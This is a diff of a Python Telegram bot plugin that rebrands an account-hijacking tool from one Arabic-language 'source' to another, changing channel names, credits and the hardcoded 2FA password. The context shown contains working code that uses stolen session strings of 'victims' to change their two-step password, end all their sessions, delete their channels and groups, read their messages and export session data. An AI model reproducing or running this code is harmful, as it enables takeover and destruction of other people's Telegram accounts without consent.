@@ -1,9 +1,9 @@
 
-from JoKeRUB import bot, l313l
-#By Source joker @jepthon
+from SedUb import bot, l313l
+#By Source joker @SedUb
 from telethon import events, functions, types, Button
 from datetime import timedelta
-from JoKeRUB.utils import admin_cmd
+from SedUb.utils import admin_cmd
 import asyncio
 from ..Config import Config
 import os, asyncio, re
@@ -80,7 +80,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('jepthon')
+      await X.edit_2fa('veevvw')
       return True
     except:
       return False
@@ -160,7 +160,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "jepthon"
+channel = "veevvw"
 menu = '''
 
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
@@ -191,7 +191,7 @@ menu = '''
 
 '''
 mm = '''
-قم بلأنضمام الى قناة الجوكر @Jepthon
+قم بلأنضمام الى قناة سيدثون @veevvw
 '''
 
 keyboard = [
@@ -216,7 +216,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("سورس الجوكر 🤡", "https://t.me/jepthon")
+    Button.url("سورس سيدثون ", "https://t.me/veevvw")
     ]
 ]
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
@@ -230,7 +230,7 @@ if Config.TG_BOT_USERNAME is not None and tgbot is not None:
         if query.startswith("هاك") and event.query.user_id == bot.uid:
             buttons = Button.url(" اضغط هنا عزيزي ", f"https://t.me/{joker}?start=hack")
             result = builder.article(
-                title="Aljoker 🤡",
+                title="SEDTHON",
                 description="اضغط على الزر لعرض الأوامر.",
                 text="**᯽︙ قم بالضغط على زر ادناه لأستخدام امر اختراق عبر كود التيرمكس",
                 buttons=buttons
@@ -273,7 +273,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("المطور", "https://t.me/jepthon")
+            Button.url("المطور", "https://t.me/VEEVVW")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -294,12 +294,12 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @Jepthon")
+        file.write(i + "\n\nDetails BY @VEEVVW")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس سيدثون ❤️. \n/hack", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -312,7 +312,7 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس سيدثون ❤️.\n/hack", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -340,7 +340,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس الجوكر", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس سيدثون", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -386,7 +386,7 @@ async def users(event):
       await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك الجوكر.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك سيدثون.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -416,7 +416,7 @@ async def users(event):
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
       if i == True:
-      	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك الجوكر.", buttons=keyboard)
+      	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك سيدثون.", buttons=keyboard)
       else:
           await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @rd0r0\n{i}")
 
@@ -508,7 +508,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("القناة", "https://t.me/Jepthon")
+        Button.url("القناة", "https://t.me/veevvw")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
